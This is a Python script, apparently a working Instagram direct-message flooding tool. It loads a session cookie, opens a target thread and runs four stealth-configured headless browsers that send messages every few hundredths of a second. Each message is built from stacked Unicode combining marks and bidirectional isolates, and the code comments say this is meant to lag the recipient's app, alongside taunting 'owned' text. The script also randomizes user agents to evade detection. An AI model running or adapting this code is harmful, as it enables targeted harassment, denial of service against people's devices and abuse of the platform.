# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (RAPID-NATIVE V81)
# 📅 STATUS: QUAD-VELOCITY-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- ⚡ QUAD-VELOCITY CONFIG ---
AGENTS_PER_MACHINE = 4             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.01, 0.08)  # 🔥 High-Frequency Delivery
REST_AFTER_STRIKES = 500   
REST_DURATION = 1          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_rapid_shaping_payload():
    """Generates a high-speed payload that is mathematically heavy to render."""
    u_id = random.randint(1000, 9999)
    # \u2068 = FSI | \u2069 = PDI (Isolates)
    # \u034F = CGJ (Combining Grapheme Joiner)
    fsi, pdi, cgj = "\u2068", "\u2069", "\u034F"
    # 80 Stacking marks (Sweet spot for speed vs lag)
    marks = "".join([chr(i) for i in range(0x0300, 0x0350)]) 
    glue = "\u2060" # Word Joiner
    
    header = f"👑 PRAVEER PAPA 👑 SYSTEM [{u_id}]"
    error_msg = f"ERROR: DEVEL HAS BEEN OWNED"
    
    body = []
    # 250 lines - Optimized for instant socket delivery
    for i in range(250):
        # We nest the error message in a shaping cluster
        # This makes it look like standard text but lag like a nuclear block
        nest = f"{fsi}P{marks}{cgj}R{marks}{cgj}A{marks}{cgj}V{marks}{cgj}EER{pdi}"
        line = f"{nest} {error_msg} 🌙 {i}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        # Randomized UA to stay safe
        ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Direct DOM injection bypassing the UI priority queue."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(12) 
            
            strike_count = 0
            while True:
                payload = get_rapid_shaping_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Rapid-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 100 == 0:
                        driver.refresh()
                        time.sleep(5)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(2)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
